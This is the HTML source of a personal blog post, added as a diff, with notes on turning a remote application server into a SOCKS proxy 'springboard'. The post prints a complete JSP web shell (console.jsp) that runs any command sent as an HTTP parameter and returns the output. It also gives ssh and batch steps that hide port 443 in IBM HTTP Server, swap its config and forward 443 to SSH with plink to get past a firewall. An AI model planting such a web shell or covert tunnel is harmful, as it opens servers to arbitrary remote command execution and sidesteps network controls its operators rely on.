@@ -1,0 +1,156 @@
+<!DOCTYPE HTML>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  <title>Create sock proxy via remote PC as a springboard | My Blog</title>
+  <meta name="author" content="Forrest Wan">
+  
+  <meta name="description" content="My Blog">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="Create sock proxy via remote PC as a springboard"/>
+  <meta property="og:site_name" content="My Blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  <link rel="shortcut icon" href="/favicon.png">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <!--[if lt IE 9]><script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script><![endif]-->
+  
+
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+
+<body>
+  <header id="header" class="inner"><div class="alignleft">
+  <h1><a href="/">My Blog</a></h1>
+  <h2><a href="/"></a></h2>
+</div>
+<nav id="main-nav" class="alignright">
+  <ul>
+    
+      <li><a href="/null">Home</a></li>
+    
+      <li><a href="/archives">Archives</a></li>
+    
+  </ul>
+  <div class="clearfix"></div>
+</nav>
+<div class="clearfix"></div>
+</header>
+  <div id="content" class="inner">
+    <div id="main-col" class="alignleft"><div id="wrapper"><article id="post-Create-sock-proxy-via-remote-PC-as-a-springboard" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time class="dt-published" datetime="2014-01-29T03:10:16.000Z"><a href="/2014/01/29/Create-sock-proxy-via-remote-PC-as-a-springboard/">2014-01-29</a></time>
+      
+      
+  
+    <h1 class="p-name title" itemprop="headline name">Create sock proxy via remote PC as a springboard</h1>
+  
+
+    </header>
+    <div class="e-content entry" itemprop="articleBody">
+      
+        <h1 id="Install-cygwin-in-my-remote-PC"><a href="#Install-cygwin-in-my-remote-PC" class="headerlink" title="Install cygwin in my remote PC"></a>Install cygwin in my remote PC</h1><h1 id="Upload-a-console-jsp-to-application-server"><a href="#Upload-a-console-jsp-to-application-server" class="headerlink" title="Upload a console.jsp to application server"></a>Upload a console.jsp to application server</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@page import=&quot;java.io.*&quot; %&gt;</span><br><span class="line">  &lt;script src=&quot;//ajax.googleapis.com/ajax/libs/jquery/1.9.0/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">  &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">  $(function()&#123;</span><br><span class="line">    $(&quot;#command&quot;).focus();</span><br><span class="line">    var cmd = &#x27;&lt;%=request.getParameter(&quot;command&quot;)%&gt;&#x27;;</span><br><span class="line">    $(&quot;#command&quot;).val(cmd == &#x27;null&#x27; ? &#x27;&#x27; : cmd);</span><br><span class="line">  &#125;);</span><br><span class="line">  &lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &lt;body bgcolor=&quot;#cdc0cd&quot;&gt;</span><br><span class="line">  &lt;form action=&quot;console.jsp&quot;&gt;</span><br><span class="line">    Command: &lt;textarea name=&quot;command&quot; rows=&quot;10&quot; cols=&quot;50&quot; id=&quot;command&quot;&gt;&lt;/textarea&gt;&lt;br/&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot;/&gt;</span><br><span class="line">  &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">  &lt;%</span><br><span class="line">  String cmd = request.getParameter(&quot;command&quot;);</span><br><span class="line">  if(cmd != null &amp;&amp; cmd.length() &gt; 0)&#123;</span><br><span class="line">    //Runtime.getRuntime().exec(cmd);</span><br><span class="line">    out.println(&quot;command = &quot; + cmd + &quot;&lt;p&gt;&lt;p&gt;&quot;);</span><br><span class="line">    StringBuilder sb = new StringBuilder();</span><br><span class="line">    String s = null;</span><br><span class="line">    try &#123;</span><br><span class="line">        Process p = Runtime.getRuntime().exec(cmd);</span><br><span class="line"></span><br><span class="line">        BufferedReader stdInput = new BufferedReader(new</span><br><span class="line">             InputStreamReader(p.getInputStream()));</span><br><span class="line"></span><br><span class="line">        BufferedReader stdError = new BufferedReader(new</span><br><span class="line">             InputStreamReader(p.getErrorStream()));</span><br><span class="line"></span><br><span class="line">        out.print(&quot;&lt;h2&gt;result as below&lt;/h2&gt;&quot;);</span><br><span class="line">        while ((s = stdInput.readLine()) != null) &#123;</span><br><span class="line">            sb.append(s+&quot;&lt;br/&gt;&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // read any errors from the attempted command</span><br><span class="line">        sb.append(&quot;&lt;hr&gt;&lt;h2&gt;error as below(if any)&lt;/h2&gt;&quot;);</span><br><span class="line">        while ((s = stdError.readLine()) != null) &#123;</span><br><span class="line">            sb.append(s);</span><br><span class="line">        &#125;</span><br><span class="line">            out.print(sb.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    catch (IOException e) &#123;</span><br><span class="line">        sb.append(&quot;exception happened - here&#x27;s what I know: &quot;);</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  %&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="Disable-port-443-in-httpd"><a href="#Disable-port-443-in-httpd" class="headerlink" title="Disable port 443 in httpd"></a>Disable port 443 in httpd</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh -i /home/prls/fw/id_rsa Administrator@server /cygdrive/c/Users/xx/fw/443-hide.bat</span><br><span class="line">copy &quot;C:\Program Files\IBM\HTTPServer\conf\httpd.conf&quot; &quot;C:\Users\xx\Downloads\fw\httpd-latest.conf&quot;</span><br><span class="line">copy &quot;C:\Users\xx\Downloads\fw\httpd2.conf&quot; &quot;C:\Program Files\IBM\HTTPServer\conf\httpd.conf&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh -i /home/prls/fw/id_rsa Administrator@server /cygdrive/c/Users/xx/fw/restart.bat </span><br><span class="line">net stop IBMHTTPServer7.0</span><br><span class="line">net start IBMHTTPServer7.0</span><br></pre></td></tr></table></figure>
+
+<h1 id="Forward-port-443-to-22"><a href="#Forward-port-443-to-22" class="headerlink" title="Forward port 443 to 22"></a>Forward port 443 to 22</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh -i /home/prls/fw/id_rsa xx@server /cygdrive/c/Users/xx/fw/443-open.bat </span><br><span class="line">rem wscript.exe C:\Users\xx\Downloads\fw\443-open.vbs C:\Users\xx\Downloads\plink.exe -load local -N &lt;span style=&quot;font-size:12.5px;line-height:1.5;&quot;&gt;&lt;/span&gt;  5. Stop process plink</span><br><span class="line">tasklist|grep plink</span><br><span class="line">taskkill /f /pid 7944</span><br></pre></td></tr></table></figure>
+
+<h1 id="Enable-port-443-in-httpd"><a href="#Enable-port-443-in-httpd" class="headerlink" title="Enable port 443 in httpd"></a>Enable port 443 in httpd</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -i /home/prls/fw/id_rsa Administrator@server /cygdrive/c/Users/xx/fw/443-show.bat</span><br><span class="line">copy &quot;C:\Users\xx\Downloads\fw\httpd-latest.conf&quot; &quot;C:\Program Files\IBM\HTTPServer\conf\httpd.conf&quot;</span><br></pre></td></tr></table></figure>
+
+<h1 id="See-config-in-httpd"><a href="#See-config-in-httpd" class="headerlink" title="See config in httpd"></a>See config in httpd</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -i /home/prls/fw/id_rsa Administrator@server /cygdrive/c/Users/xx/fw/cat-httpd.bat</span><br><span class="line">copy &quot;C:\Users\xx\Downloads\fw\httpd-latest.conf&quot; &quot;C:\Program Files\IBM\HTTPServer\conf\httpd.conf&quot;</span><br></pre></td></tr></table></figure>
+
+<h1 id="Make-it-effective"><a href="#Make-it-effective" class="headerlink" title="Make it effective"></a>Make it effective</h1><p><code>ssh -i /home/prls/fw/id_rsa Administrator@server /cygdrive/c/Users/xx/fw/restart.bat</code></p>
+<h1 id="Fallback-a-backup-version"><a href="#Fallback-a-backup-version" class="headerlink" title="Fallback a backup version"></a>Fallback a backup version</h1><p><code>ssh -i /home/prls/fw/id_rsa Administrator@server /cygdrive/c/Users/xx/fw/443-fallback.bat</code></p>
+
+      
+    </div>
+    <footer>
+      
+        
+        
+  
+  <div class="tags">
+    <a href="/tags/%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/">日常记录</a>
+  </div>
+
+        
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+</div></div>
+    <aside id="sidebar" class="alignright">
+  <div class="search">
+  <form action="//google.com/search" method="get" accept-charset="utf-8">
+    <input type="search" name="q" results="0" placeholder="Search">
+    <input type="hidden" name="as_sitesearch" value="l1z2g9.github.io">
+  </form>
+</div>
+
+
+  
+
+  
+<div class="widget tag">
+  <h3 class="title">Tags</h3>
+  <ul class="entry">
+  
+    <li><a href="/tags/AIX/">AIX</a><small>29</small></li>
+  
+    <li><a href="/tags/MySQL/">MySQL</a><small>2</small></li>
+  
+    <li><a href="/tags/Oracle/">Oracle</a><small>14</small></li>
+  
+    <li><a href="/tags/Problem-Solve/">Problem Solve</a><small>8</small></li>
+  
+    <li><a href="/tags/Raspberry-Pi/">Raspberry Pi</a><small>12</small></li>
+  
+    <li><a href="/tags/%E5%B7%A5%E4%BD%9C%E6%97%A5%E5%BF%97/">工作日志</a><small>68</small></li>
+  
+    <li><a href="/tags/%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/">日常记录</a><small>23</small></li>
+  
+  </ul>
+</div>
+
+</aside>
+    <div class="clearfix"></div>
+  </div>
+  <footer id="footer" class="inner"><div class="alignleft">
+  
+  &copy; 2022 Forrest Wan
+  
+</div>
+<div class="clearfix"></div></footer>
+  
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+
+
+<script src="/js/gallery.js"></script>
+
+
+
+
+
+</body>
+</html>
